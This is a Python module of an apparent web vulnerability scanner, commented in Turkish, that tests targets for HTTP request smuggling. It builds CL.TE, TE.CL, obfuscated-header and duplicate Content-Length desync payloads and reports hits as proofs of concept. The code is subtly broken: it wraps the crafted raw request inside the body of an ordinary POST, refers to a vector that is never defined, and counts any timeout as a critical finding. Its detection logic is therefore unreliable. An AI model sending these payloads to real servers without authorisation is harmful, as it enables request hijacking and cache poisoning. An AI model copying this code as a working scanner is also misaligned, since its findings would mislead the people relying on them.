# path: core/scanners/http_smuggling_scanner.py

import aiohttp
import asyncio
import re
import json
from time import time
from typing import Callable, List, Dict, Any, Optional, Tuple # KRİTİK DÜZELTME: Tuple eklendi
from urllib.parse import urlparse, urljoin

from core.scanners.base_scanner import BaseScanner
from core.data_simulator import DataSimulator # Random string generation için

class HTTPSmugglingScanner(BaseScanner):
    """
    [FAZ 32 - SMUGGLING HUNTER v2.2 - Gelişmiş Header Ambiguity Testleri]
    HTTP Request Smuggling zafiyetlerini (CL.TE, TE.CL, CL.CL) tespit etmek için
    gelişmiş test vektörleri kullanır.
    """

    PER_MODULE_LIMIT = 3 

    # EOL Karakterleri
    CRLF = "\r\n"
    LF = "\n"

    # Smuggled request'in (arka sunucu için) sabit kısmı. 
    # Bu istek, ön sunucuya "smuggle" edilmeye çalışılır.
    SMUGGLED_REQUEST_TEMPLATE = (
        "GET /smuggled?{random_id} HTTP/1.1{eol}"
        "Host: {host}{eol}"
        "X-Smuggled: 1{eol}"
        "{eol}"
    )

    # --- KRİTİK SMUGGLING AMBIGUITY VARYASYONLARI ---
    SMUGGLING_VECTORS = {
        # 1. CL.TE Standart (FE: CL, BE: TE)
        "CL.TE_Standard": {
            "MAIN_HEADERS": ["Content-Length: {CL}", "Transfer-Encoding: chunked"],
            "BODY_TEMPLATE": "{chunked_body}", # Body: 4\r\nSMUGGLE\r\n0\r\n\r\nGET...
            "TEST_CASE": "CL.TE: Standart (FE CL kullanır, BE TE kullanır)."
        },
        # 2. TE.CL Standart (FE: TE, BE: CL)
        "TE.CL_Standard": {
            "MAIN_HEADERS": ["Transfer-Encoding: chunked", "Content-Length: {CL}"],
            "BODY_TEMPLATE": "{TE_CL_body}", # Body: 7\r\nSMUGGLE\r\n0\r\n\r\nGET...
            "TEST_CASE": "TE.CL: Standart (FE TE kullanır, BE CL kullanır)."
        },
        # 3. CL.TE_Space (Obfuscation)
        "CL.TE_Space": {
            "MAIN_HEADERS": ["Content-Length: {CL}", "Transfer-Encoding : chunked"], # Header adına boşluk
            "BODY_TEMPLATE": "{chunked_body}",
            "TEST_CASE": "CL.TE Space: Transfer-Encoding başlığında boşluk kullanılarak gizleme."
        },
        # 4. TE.CL_Tab (Obfuscation)
        "TE.CL_Tab": {
            "MAIN_HEADERS": ["Transfer-Encoding: chunked", "Content-Length:\t{CL}"], # CL değerinde tab karakteri
            "BODY_TEMPLATE": "{TE_CL_body}",
            "TEST_CASE": "TE.CL Tab: Content-Length başlığında yatay tab (\t) kullanılarak gizleme."
        },
        # 5. CL.CL_Duplicate (Duplicate Header)
        "CL.CL_Duplicate": {
            "MAIN_HEADERS": ["Content-Length: {CL_FE}", "Content-Length: {CL_BE}"], 
            "BODY_TEMPLATE": "{CL_CL_body}",
            "TEST_CASE": "CL.CL Duplicate: Aynı anda iki Content-Length kullanarak desync."
        }
    }


    def __init__(self, logger, results_callback, request_callback: Callable[[], None]):
        super().__init__(logger, results_callback, request_callback)
        self.module_semaphore = asyncio.Semaphore(self.PER_MODULE_LIMIT)

    @property
    def name(self):
        return "HTTP Request Smuggling Tarayıcısı"

    @property
    def category(self):
        return "HTTP_SMUGGLING"

    async def scan(self, url: str, session: aiohttp.ClientSession, completed_callback: Callable[[], None]):
        self.log(f"[{self.category}] HTTP Smuggling testleri başlatılıyor...", "INFO")
        
        host = self._get_host_header(url)
        if not host:
            self.log(f"[{self.category}] Geçersiz URL formatı, tarama durduruldu.", "WARNING")
            completed_callback()
            return

        tasks = []
        for vector_name, vector in self.SMUGGLING_VECTORS.items():
            tasks.append(self._test_smuggling_vector(url, host, session, vector_name, vector))

        await asyncio.gather(*tasks)

        completed_callback()
        
    def _get_host_header(self, url: str) -> str:
        """URL'den Host başlığını (port dahil) ayıklar."""
        try:
            return urlparse(url).netloc
        except:
            return ""

    def _prepare_request(self, host: str, vector_name: str, vector: Dict[str, Any]) -> Tuple[bytes, str]:
        """
        Belirtilen vektöre göre raw HTTP isteğini hazırlar ve random ID'yi döndürür.
        """
        eol = self.CRLF
        random_id = DataSimulator.generate_random_string(8) 
        
        smuggled_request = self.SMUGGLED_REQUEST_TEMPLATE.format(
            random_id=random_id,
            host=host,
            eol=eol
        ).encode('utf-8')
        
        # --- TE.CL / CL.TE İçin Sabit Gövde Parçaları ---
        # CL.TE: FE CL'yi okur (gövde uzunluğu), BE TE'yi okur (chunked). 
        # Smuggled Request'i bir chunk'ın sonuna ekleriz. FE CL'yi okur.
        chunked_body_base = f"{hex(len(smuggled_request))[2:]}{eol}".encode('utf-8') + smuggled_request + f"{eol}0{eol}{eol}".encode('utf-8')
        
        # TE.CL: FE TE'yi okur (chunked), BE CL'yi okur (smuggled request'i ilk isteğin gövdesi sanar).
        # Normal isteğin gövdesini oluştururuz. Smuggled request, normal isteğin gövdesinin hemen sonuna, 
        # ancak ilk Content-Length'in dışına smuggle edilir.
        # Burada saldırganın payload'ı CL'yi yanlış okumaya zorlar.
        # Normalde bu tekniklerde farklı uzunlukta CL ve TE değerleri kullanılır.
        # Simplistic TE.CL body (FE bunu chunked body olarak okur, BE ise CL'yi okur)
        TE_CL_body = f"0{eol}{eol}".encode('utf-8') + smuggled_request
        
        # --- Gövde Hesaplama ve Ana Başlık Değerleri ---

        cl_fe_len = len(chunked_body_base) # FE için CL uzunluğu (CL.TE)
        cl_be_len = len(TE_CL_body)       # BE için CL uzunluğu (TE.CL)
        
        if "CL.TE" in vector_name:
            # FE (CL) ize eden sunucuya Content-Length = chunked_body_base + 1 (fazladan byte) gönderilir.
            # BE (TE) ise, chunked encoding'i okur ve fazladan baytı sonraki isteğin başlangıcı sayar.
            cl_value = len(chunked_body_base) + 1 # Fazladan byte (X)
            body = chunked_body_base + b'X'
            
        elif "TE.CL" in vector_name:
             # FE (TE) okur: Body'yi TE_CL_body olarak gönderir.
             # BE (CL) okur: Body'nin CL uzunluğunu okur. Content-Length değeri body'nin tamamından daha küçüktür (smuggled request'i atlar).
             
             # CL_FE_VALUE = len(TE_CL_body)
             # CL_BE_VALUE = len(TE_CL_body) - len(smuggled_request) # TE.CL için BE'yi şaşırtacak daha kısa bir CL değeri gerekir.
             
             # Simplest TE.CL Body (FE bunu chunked body olarak okur, BE ise CL'yi okur)
             cl_value = len(TE_CL_body)
             body = TE_CL_body
             
        elif "CL.CL_Duplicate" in vector_name:
             # CL_FE = İlk CL (FE'yi tatmin eder), CL_BE = İkinci CL (BE'yi desync eder).
             
             # FE'yi tatmin eden CL: Body'nin tamamının uzunluğu.
             cl_full = len(smuggled_request)
             
             # BE'yi şaşırtan CL: Yalnızca ilk chunk'ın sonuna kadar olan uzunluk.
             cl_short = len(smuggled_request) - 4 # Örnek şaşırtma değeri
             
             # CL.CL'de CL_FE ve CL_BE'yi placeholder olarak kullanıyoruz.
             cl_value = cl_full 
             
             # CL.CL için body genelde smuggle edilmek istenen request'tir.
             body = smuggled_request
             
             # Header'ları CL_FE ve CL_BE ile formatlayalım.
             header_parts = []
             for header_template in vector["MAIN_HEADERS"]:
                 if "CL_FE" in header_template:
                     header_parts.append(header_template.replace("{CL_FE}", str(cl_full)))
                 elif "CL_BE" in header_template:
                      header_parts.append(header_template.replace("{CL_BE}", str(cl_short))) # BE'yi şaşırtmak için kısa CL
                 else:
                     header_parts.append(header_template)
             
             header_str = eol.join(header_parts)
             
             # Ana isteği oluştur
             request_line = f"POST / HTTP/1.1{eol}"
             headers = f"Host: {host}{eol}{header_str}{eol}Connection: close{eol}{eol}"
             
             full_request = request_line.encode('utf-8') + headers.encode('utf-8') + body
             return full_request, random_id


        # Ana Başlıkların Oluşturulması
        header_parts = []
        for header_template in vector["MAIN_HEADERS"]:
            header_parts.append(header_template.format(CL=cl_value, host=host))
        
        header_str = eol.join(header_parts)

        # Ana isteği (H2/H1) oluştur
        request_line = f"POST / HTTP/1.1{eol}"
        headers = f"Host: {host}{eol}{header_str}{eol}Connection: close{eol}{eol}"
        
        # LF Smuggling için header'lar arasına sadece LF kullan
        if "CL.TE_LF_SMUGGLE" in vector_name:
             headers = headers.replace(self.CRLF, self.LF)
        
        full_request = request_line.encode('utf-8') + headers.encode('utf-8') + body


        return full_request, random_id


    async def _test_smuggling_vector(self, url: str, host: str, session: aiohttp.ClientSession, 
                                     vector_name: str, vector: Dict[str, Any]):
        """
        Tek bir Smuggling vektörünü dener ve yanıt gecikmesini/kodunu izler.
        """
        try:
            # İsteği hazırla
            request_bytes, random_id = self._prepare_request(host, vector_name, vector)
        except Exception as e:
            self.log(f"[{self.category}] Hazırlık Hatası ({vector_name}): {type(e).__name__} ({e})", "CRITICAL")
            return

        
        self.log(f"[{self.category}] Deneniyor ({vector_name}): {vector['TEST_CASE']}", "INFO")

        SMUGGLING_TIMEOUT = 10 
        
        try:
            self.request_callback()
            start_time = time()
            
            # Smuggling testlerinde raw body gönderildiğinden, aiohttp'nin Content-Type'ı 
            # otomatik eklemesini engellemek için headers'ı manuel set ediyoruz.
            async with session.post(url, data=request_bytes, headers={'Content-Type': 'text/plain'}, timeout=aiohttp.ClientTimeout(total=SMUGGLING_TIMEOUT)) as res:
                end_time = time()
                latency = end_time - start_time
                
                response_text = await res.text()
                
                # --- SMUGGLING TESPİT MANTIĞI ---
                
                # 1. Reflection Check (Kritik)
                # Smuggled request'in (random_id) yanıtta yansıyıp yansımadığı kontrol edilir.
                is_reflected = f"?{random_id}" in response_text
                
                # 2. Time-Based Check
                # Dinamik olarak hesaplanan eşik burada kullanılabilir, ancak basitlik ve lab uyumluluğu için 
                # sabit bir gecikme eşiği kullanılır.
                is_time_based = latency >= SMUGGLING_TIMEOUT * 0.8
                
                if is_reflected:
                    message = f"KRİTİK SMUGGLING TESPİTİ (Reflection): Smuggled ID ({random_id}) yanıtta yansıdı. Vektör: {vector_name}"
                    self._report_smuggling(message, request_bytes, vector_name, url)
                    
                elif is_time_based:
                    # Time-based: Genellikle arka sunucunun (BE) sonraki isteği beklerken zaman aşımına uğradığı anlamına gelir.
                    message = f"Potansiyel TE.CL/CL.TE Smuggling Tespiti (Time-Based) - Sunucu {latency:.2f}s gecikti. Vektör: {vector_name}"
                    self._report_smuggling(message, request_bytes, vector_name, url, is_critical=False)
                    
                else:
                    self.log(f"[{self.category}] Başarısız ({vector_name}): Status {res.status}, Gecikme {latency:.2f}s.", "INFO")

        except asyncio.TimeoutError:
            # Timeout alması, arka sunucunun (BE) beklenen son chunk'ı veya CL'yi beklediği anlamına gelir.
            message = f"Potansiyel CL.TE/TE.CL Smuggling Tespiti (Hard Timeout) - Sunucu {SMUGGLING_TIMEOUT}s sonra yanıt vermeyi kesti. Vektör: {vector_name}"
            self._report_smuggling(message, request_bytes, vector_name, url)
            
        except Exception as e:
            self.log(f"[{self.category}] Genel Hata ({vector_name}): {type(e).__name__}", "WARNING")

    def _report_smuggling(self, message: str, request_bytes: bytes, vector_name: str, url: str, is_critical: bool = True):
        """
        Smuggling bulgusunu formatlayıp raporlar.
        """
        srp_score = 25.0 if is_critical else 15.0 # Reflection kritik, Time-based biraz daha düşük.
        level = "CRITICAL" if is_critical else "HIGH"
        
        raw_request_str = request_bytes.decode('utf-8', errors='ignore').replace(self.CRLF, "\\r\\n").replace(self.LF, "\\n")
        
        poc_data = {
            "url": url,
            "vector": vector_name,
            "raw_request": raw_request_str,
            "description": message
        }

        self.add_result(
            self.category,
            level,
            f"[SMUGGLING BULGUSU] {message}",
            srp_score,
            poc_data=poc_data
        )

        self.log(f"[{self.category} | {level}] {message}", level)